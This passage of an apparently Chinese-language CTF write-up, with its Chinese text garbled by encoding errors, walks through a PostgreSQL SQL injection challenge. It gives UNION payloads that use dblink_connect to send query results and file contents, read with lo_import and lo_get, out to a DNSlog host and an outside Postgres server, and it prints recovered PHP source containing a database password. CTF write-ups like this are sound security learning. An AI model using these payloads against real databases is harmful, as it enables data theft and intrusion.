href="#æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥" class="headerlink" title="æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥"></a>æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥</h3><p> postgrestæ•°æ®åº“ä¸­çš„å»¶æ—¶å‡½æ•°æœ‰<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼š</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleepè®©å½“å‰çš„ä¼šè¯è¿›ç¨‹ä¼‘çœ seconds ç§’ä»¥åå†æ‰§è¡Œã€‚secondsæ˜¯ä¸€ä¸ªdouble precision ç±»å‹çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥æŒ‡å®šå¸¦å°æ•°çš„ç§’æ•°ã€‚<br>pg_sleep_for å¯¹äºæŒ‡å®šä¸ºintervalçš„è¾ƒé•¿ç¡çœ æ—¶é—´æ˜¯ä¸€ä¸ªä¾¿åˆ©å‡½æ•°ã€‚<br>pg_sleep_untilåœ¨éœ€è¦ç‰¹å®šå”¤é†’æ—¶é—´æ—¶æ¯”è¾ƒä¾¿åˆ©ã€‚</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(â€˜5 minutesâ€™);<br>SELECT pg_sleep_until(â€˜tomorrow 03:00â€™);</p></blockquote><p>å½“æ—¶æ¯”èµ›è„šæœ¬å‚è€ƒ <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>è¿™é‡Œä¸åšé˜è¿°ï¼Œå› ä¸ºæœ€ç»ˆå¾—å‡ºç»“æœ</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>è¡¨ä¸ºç©ºï¼Œæ‰€ä»¥æœ¬é¢˜åº”è¯»å–æ–‡ä»¶</p><h3 id="æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–"><a href="#æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–" class="headerlink" title="æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–"></a>æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–</h3><p>åˆ©ç”¨DNSlogæ–¹å¼</p><p>åœ¨PostgreSQLä¸­ï¼Œå­˜åœ¨dblinkæ¨¡å—ï¼Œå¯ä»¥å¤–è”æ•°æ®åº“æˆ–è€…å½“å‰æ•°æ®åº“ï¼Œdblink_connectåŒæ—¶ä¼šå¯¹hostè¿›è¡ŒDNSæŸ¥è¯¢ï¼Œåˆ©ç”¨æŸ¥è¯¢ç»™å®šDNSçš„å­åŸŸåï¼Œå†æŸ¥DNSè§£æè®°å½•å³å¯è·å–ä¼ é€’çš„ä¿¡æ¯ï¼Œè¿™é‡Œç”¨<a href="http://ceye.io/">ceye</a>æ¥è®°å½•</p><p>é¦–å…ˆçœ‹çœ‹dblinkæ¨¡å—æœ‰æ²¡æœ‰å¼€å¯</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å¯ä»¥æ“ä½œç»§ç»­å°è¯•</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxxæ˜¯ceyeä¸ªäººçš„ Identifier ï¼Œå¯è§æˆåŠŸè¿”å›äº†å½“å‰æ•°æ®åº“å</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>åŸç†æ˜¯é€šè¿‡<code>.</code>è¿æ¥ï¼Œè®©pgsqlå»è§£æhostå³ç»™å®šDNSçš„å­åŸŸåï¼Œä»è€Œå¸¦å‡ºä¿¡æ¯ã€‚é¡ºç€è¿™ä¸ªæ–¹æ³•å¯ä»¥å¸¦å‡ºæ¥éƒ¨åˆ†ä¿¡æ¯</p><p>æ¥ç€å°±è¦è€ƒè™‘å¦‚ä½•æ–‡ä»¶åŒ…å«äº†ï¼Œåœ¨è¿™é‡ŒåŸWPå†™çš„å¾ˆæ¸…æ¥š</p><blockquote><p>æˆ‘ä»¬å¯èƒ½ç¡®å®éœ€è¦ä»ä¸­çªƒå–æ•°æ®<code>/var/lib/postgresql/data/secret</code>ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨<code>pg_read_file</code>æˆ–<code>pg_read_binary_file</code>è¯»å–æ–‡ä»¶ï¼Œåˆ™ä¸ä¼šè·å¾—ä¼ å…¥è¿æ¥ï¼Œå› æ­¤å½“å‰ç”¨æˆ·å¯èƒ½æ— æƒä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚</p><p>è¯»å–æ–‡ä»¶çš„æ›¿ä»£æ–¹æ³•æ˜¯ä½¿ç”¨<a href="https://www.postgresql.org/docs/11/lo-funcs.html">å¤§å¯¹è±¡</a>ã€‚æˆ‘ä»¬å¯ä»¥ç”¨æ¥<code>lo_import</code>å°†æ–‡ä»¶çš„å†…å®¹åŠ è½½åˆ°<code>pg_largeobject</code>ç›®å½•ä¸­ã€‚å¦‚æœæŸ¥è¯¢æˆåŠŸï¼Œæˆ‘ä»¬å°†è·å¾—å¯¹è±¡çš„<code>oid</code>ã€‚</p></blockquote><p> å½“å‰ç”¨æˆ·ä¸ºdockerï¼Œä¸å¤Ÿæƒé™æ‰§è¡Œç³»ç»Ÿç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„å‡½æ•°<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ï¼Œä¹Ÿä¸æ–¹ä¾¿å†™udfï¼Œæ²¡æœ‰å†™æƒé™ã€‚</p><p>ä¸‹é¢æˆªå–åŸWPçš„éƒ¨åˆ†å†…å®¹ï¼š</p><blockquote><p>ç¢°åˆ°è¿™ç§æƒ…å†µä¹Ÿå°±æ˜¯éœ€è¦ç»•è¿‡çš„æ—¶å€™çš„åšæ³•ï¼Œä¸€èˆ¬éƒ½æ˜¯è°·æ­Œç™¾åº¦ï¼Œç„¶åé˜…è¯»æ–‡æ¡£ï¼Œå¦å¤–å¯ä»¥è‡ªå·±èµ·ä¸€ä¸ªç¯å¢ƒå»æœç´¢ç›¸å…³çš„å‡½æ•°ã€‚ä¾‹å¦‚åœ¨è¿™é‡Œï¼Œbalsnçš„åšæ³•æ˜¯å¦å¤–èµ·ä¸€ä¸ªç¯å¢ƒï¼š</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   æŸ¥è¯¢æ‰€æœ‰å¸¦æœ‰fileçš„å‡½æ•°pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>ä½†æ˜¯è¿™äº›å‡½æ•°éƒ½ä¼¼ä¹æ²¡èµ·ä½œç”¨</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   æŸ¥é˜…å¸¦æœ‰readçš„å‡½æ•°loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼Œé€šè¿‡æŸ¥é˜…æ–‡æ¡£ï¼ˆå­¦ä¼šé˜…è¯»æ–‡æ¡£å¾ˆé‡è¦ï¼ï¼‰</p><p>loreadæ˜¯é¢å‘SQLçš„å¤§å¯¹è±¡å‡½æ•°ï¼Œæ¯”å¦‚<code>lo_from_bytea</code>ï¼Œ<code>lo_put</code>ï¼Œ<code>lo_get</code>ï¼Œ<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;ï¼Œ &#96;lo_import&#96;å’Œ &#96;lo_export</code></pre><p> æœåŠ¡å™¨ç«¯çš„<code>lo_import</code>å’Œ <code>lo_export</code>å‡½æ•°å’Œå®¢æˆ·ç«¯çš„é‚£å‡ ä¸ªæœ‰ç€æ˜¾è‘—çš„ä¸åŒã€‚ è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿé‡Œè¯»å†™æ–‡ä»¶ï¼Œ ä½¿ç”¨æ•°æ®åº“æ‰€æœ‰è€…çš„æƒé™è¿›è¡Œã€‚ å› æ­¤ï¼Œåªæœ‰è¶…çº§ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ä»–ä»¬ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå®¢æˆ·ç«¯çš„è¾“å…¥å’Œè¾“å‡ºå‡½æ•°åœ¨å®¢æˆ·ç«¯çš„æ–‡ä»¶ç³»ç»Ÿé‡Œè¯»å†™æ–‡ä»¶ï¼Œ ä½¿ç”¨å®¢æˆ·ç«¯ç¨‹åºçš„æƒé™ã€‚å®¢æˆ·ç«¯å‡½æ•°ä¸éœ€è¦è¶…çº§ç”¨æˆ·æƒé™ã€‚<br><code>lo_read</code>å’Œ<code>lo_write</code>çš„åŠŸèƒ½é€šè¿‡æœåŠ¡å™¨ç«¯è°ƒç”¨å¯ç”¨ï¼Œ ä½†æ˜¯æœåŠ¡å™¨ç«¯å‡½æ•°åä¸åŒäºå®¢æˆ·ç«¯æ¥å£ï¼Œå› ä¸ºä»–ä»¬ä¸åŒ…å«ä¸‹åˆ’çº¿ã€‚ä½ å¿…é¡»ä½œä¸º<code>loread</code>å’Œ<code>lowrite</code> è°ƒç”¨è¿™äº›å‡½æ•°ã€‚ </p><p>åœ¨å°†æœåŠ¡å™¨ç«¯lo_importå’Œlo_exportå‡½æ•°æˆæƒç»™éè¶…çº§ç”¨æˆ·æ—¶éœ€è¦ä»”ç»†è€ƒè™‘å®‰å…¨éšæ‚£ã€‚ å…·æœ‰æ­¤ç±»æƒé™çš„æ¶æ„ç”¨æˆ·å¯ä»¥è½»æ¾åœ°å°†å…¶å˜ä¸ºè¶…çº§ç”¨æˆ·ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡é‡å†™æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼‰ï¼Œæˆ–è€…å¯ä»¥æ”»å‡»æœåŠ¡å™¨çš„å…¶ä½™æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ— éœ€è·å–æ•°æ®åº“è¶…çº§ç”¨æˆ·æƒé™ã€‚ å› æ­¤ï¼Œå¯¹è¿™ä¸¤ä¸ªå‡½æ•°çš„æƒé™æˆäºˆå¿…é¡»è°¨æ…ã€‚</p></blockquote><p>å›åˆ°é¢˜ç›®ä¸­æ¥ï¼Œlo_importæ–¹æ³•å¯ä»¥è¯»å–æ–‡ä»¶ä¸ºpostgreså¯¹è±¡ï¼ŒåŸå‡†å¤‡åˆ©ç”¨lo_exportå†™æ–‡ä»¶ï¼Œå¯æ˜¯åº”è¯¥æ˜¯æ²¡æœ‰æƒé™</p><p>æˆ‘ä»¬å…ˆåŒ…å«<code>index.php</code>çœ‹çœ‹æºç </p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>è¯·æ³¨æ„ï¼è¯·æ³¨æ„ï¼è¯·æ³¨æ„ï¼</strong>é”™è¯¯å†™æ³•ï¼š</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>è¡¨é¢ä¸Šç¡®å®è¿”å›äº†oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>ä½†æ˜¯ï¼Œåœ¨ dblinkä¸‹ lo_importåªæ˜¯åœ¨vpsä¸Šçš„ ç”Ÿæ•ˆï¼Œå¹¶æ²¡æœ‰å®é™…åŒ…å«ï¼Œåœ¨æ–¹å¼ä¸‰ä¼šæœ‰å®éªŒè¯æ˜ï¼Œåœ¨æœ€åæœ‰å¯¹æ³¨å…¥ç‚¹çš„è§£é‡Šã€‚</p><p>ç„¶åæ¥ä¸‹æ¥å‘ç°ï¼Œè¿™é‡Œåˆ©ç”¨DNSlogè¿›è¡Œä¿¡æ¯å¤–å¸¦è¿˜æœ‰çš„é—®é¢˜æ˜¯è¦éµå¾ªDNSåè®®ï¼Œæœ€å¤§ä½æ•°ä¸è¶…è¿‡63ä½ï¼Œä¸”ä¸èƒ½æœ‰ä»»ä½•ç‰¹æ®Šç¬¦å·åŠç©ºæ ¼å›è½¦ä¹‹ç±»çš„ï¼Œåªèƒ½ç”¨<code>substring</code>å‡½æ•°ä¸€æ®µä¸€æ®µæˆªå–ï¼Œè¿˜å¾—<code>replace</code>æ›¿æ¢å­—ç¬¦ï¼Œå¯ä»¥å®Œæˆä½†éå¸¸éº»çƒ¦ï¼Œä¸æ¨èä½¿ç”¨ã€‚</p><h3 id="æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”"><a href="#æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”" class="headerlink" title="æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”"></a>æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”</h3><p>ä¸ºäº†æ›´å¥½ç†è§£ï¼Œä¸‹é¢å…ˆè¿›è¡Œå®éªŒæµ‹è¯•ï¼Œdblinkä¸‹ lo_importåªæ˜¯åœ¨vpsä¸Šçš„ ç”Ÿæ•ˆï¼Œå¹¶æ²¡æœ‰å®é™…åŒ…å«ï¼Œè¯¦æƒ…å¯è§å¦‚ä¸‹</p><hr><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>æœåŠ¡å™¨æˆ–æœ¬åœ°èµ·ä¸€ä¸ªpgsqlæœåŠ¡ï¼Œå¯ä»¥å®‰è£…ï¼Œä¹Ÿå¯ä»¥dockerèµ·ä¸€ä¸ªè®°å¾—å¼€ç«¯å£æ˜ å°„ï¼Œç„¶åå°†å…¶ä¸­çš„<code>postgresql.conf</code>ä¸­è®¾ç½®<code>listen_addresses = &#39;*&#39;</code>ä»¥ç›‘å¬ã€‚ç„¶åè¿è¡Œtcpdumpç›‘å¬ç«¯å£æµé‡</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>é»˜è®¤ç«¯å£ä¸º5432</p><p>dblinkä¸‹åŒ…å«æ–‡ä»¶</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>è¿”å›oid16438ï¼Œæˆ‘ä»¬è¯»å–ä¸€ä¸‹æ‰€æœ‰oidåˆ—è¡¨çœ‹ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼ŒåŒæ—¶ï¼Œ<strong>æ²¡æœ‰ä»»ä½•æ•°æ®è¿”å›</strong></p><p>è€Œæˆ‘ä»¬ç›´æ¥åŒ…å«<code>index.php</code>è¯•ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œå†æŸ¥ä¸€ä¸‹oidåˆ—è¡¨</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>æœ‰æ•°æ®è¿”å›ï¼ŒåŒæ—¶å¯è§16439å’Œ16440ï¼Œè€Œ16438å¹¶æ²¡æœ‰åœ¨åˆ—è¡¨ä¸­ï¼Œè¯»å–16438æ•°æ®æ²¡æœ‰è¿”å›ï¼Œè¯»å–16439ä¸16440æ­£å¸¸è¿”å›</p><p>å¯è§dblinkä¸‹lo_importåœ¨æœ¬åœ°æ˜¯ä¸ç”Ÿæ•ˆçš„</p><hr><p>è¿™æ˜¯åŸWPé‡Œçš„é”™è¯¯ï¼ŒåŸå› åœ¨äºå…¶flagæ–‡ä»¶æœ¬èº«å°±å·²ç»åŒ…å«åœ¨å¤§å¯¹è±¡é‡Œï¼Œæ‰€ä»¥ç›´æ¥å°±å¯æŸ¥è¯¢ï¼Œè€ŒdblinkçŠ¶æ€ä¸‹å¹¶æ²¡æœ‰ç”Ÿæ•ˆï¼Œç®—æ˜¯è¿™æ¬¡æ¯”èµ›è¿™é“é¢˜ç›®çš„æœ€å¤§æ”¶è·å§ã€‚</p><p>å¦‚å®éªŒæ‰€ç¤ºï¼Œæµç¨‹å¦‚ä¸‹ï¼ŒIPè®°å¾—æ›¿æ¢æˆè‡ªå·±çš„</p><p>é¦–å…ˆèµ·æœåŠ¡å¦‚å®éªŒä¸­æ‰€ç¤º</p><p>å…ˆå°†<code>index.php</code>åŒ…å«è¿›æ¥ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰çº¿ç´¢</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>ç„¶åè¯»å–å…¨éƒ¨oidåˆ—è¡¨</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>ï¼ˆå¤šæŒ‰å‡ ä¸‹å°±ä¼šæœ‰å¤šä¸ªoidï¼Œè§è°…â€¦ï¼‰</p><p>ç„¶åè¯»<code>index.php</code>çš„oidè¯»å–æ•°æ®ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»ï¼Œlo_getæ•°æ®è½¬ç ä¸ºUTF-8ï¼Œç„¶åæ›¿æ¢æ¢è¡Œç¬¦(chr(10))å†æ›¿æ¢ç©ºæ ¼(chr(32))å³å¯æ˜æ–‡è¯»å–</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>å½“ç„¶çœ‹ä¸æ¸…å¯ä»¥base64è¯»å–è‡ªå·±è½¬</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>å¾—åˆ°<code>index.php</code>æºç </p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;ÂHTTP_USER_AGENTÂ¸Â­Â—--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>å¥½åƒæ²¡å•¥ï¼Œæ ¹æ® <code>hintï¼šä¸æ˜¯æ‰€æœ‰sqléƒ½å«PostgreSQLï¼›flagåœ¨webç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶é‡Œã€‚</code> ç¡®å®šï¼Œå…³é”®æ–‡ä»¶è‚¯å®šåœ¨è¿™é‡Œï¼Œäºæ˜¯ç»§ç»­å°è¯•ï¼Œè¯»åˆ°äº†<code>.hatccess</code>ï¼ŒåŒ…å«ä¸€ä¸‹ï¼Œå†è¯»ä¸€ä¸‹</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>å¯ç–‘æ–‡ä»¶<code>pushF1n4AnK</code>ï¼Œè¯»ä¸€ä¸‹</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>è‡³æ­¤é¢˜ç›®ç»“æŸäº†</p><p>æœ€åè¯´ä¸€ä¸‹æ³¨å…¥ç‚¹çš„é—®é¢˜</p><h3 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>å¯¹äºDNSlogï¼Œæ³¨å…¥ç‚¹åœ¨hostï¼Œå³<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>ï¼Œä¸Šé¢å·²è§£é‡Šè¿‡</p><h4 id="æ•°æ®åº“å¤–è”"><a href="#æ•°æ®åº“å¤–è”" class="headerlink" title="æ•°æ®åº“å¤–è”"></a>æ•°æ®åº“å¤–è”</h4><p>æ³¨å…¥ç‚¹åœ¨æ˜æ–‡ä¼ è¾“çš„éƒ¨åˆ†ï¼Œå³<code>... user=&#39;|| (query) ||&#39;...</code>å’Œ<code>... dbname=&#39;||(query) &#39;</code>æœ€åä¸éœ€è¦<code>|</code>è¿æ¥ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰ä¸œè¥¿åŠ äº†ä¼šæŠ¥é”™</p><p>ä¸¾ä¾‹ï¼Œä¾‹å¦‚åœ¨è·å–æ‰€æœ‰å¤§å¯¹è±¡oidæ—¶ï¼Œåœ¨<code>user</code>å¤„æ³¨ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>å³<code>user</code>å’Œ<code>dbname</code>å¤„éƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„éƒ½å¯ä»¥æ³¨ï¼Œè€Œpasswordä¸è¡Œ</p><h2 id="æ„Ÿè°¢"><a href="#æ„Ÿè°¢" class="headerlink" title="æ„Ÿè°¢"></a>æ„Ÿè°¢</h2><p>æ„Ÿè°¢ <a href="https://ha1c9on.top/">@HA1C9ON</a> å¤§ä½¬çš„æ•™å¯¼ï¼Œæ„Ÿè°¢ @egg å¸ˆå‚…çš„æŒ‡å¯¼ï¼Œä»¥åŠå’Œ @R1chm0nd å¸ˆå‚…èµ›åè®¨è®ºæŒ‡æ­£payloadä¸­<code>user=&#39; || (query) || &#39;</code>çš„<code>|</code>æˆ–ç¬¦åˆå…¶å®æ˜¯è¿æ¥ç¬¦ï¼Œå­¦ä¹ äº†ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a 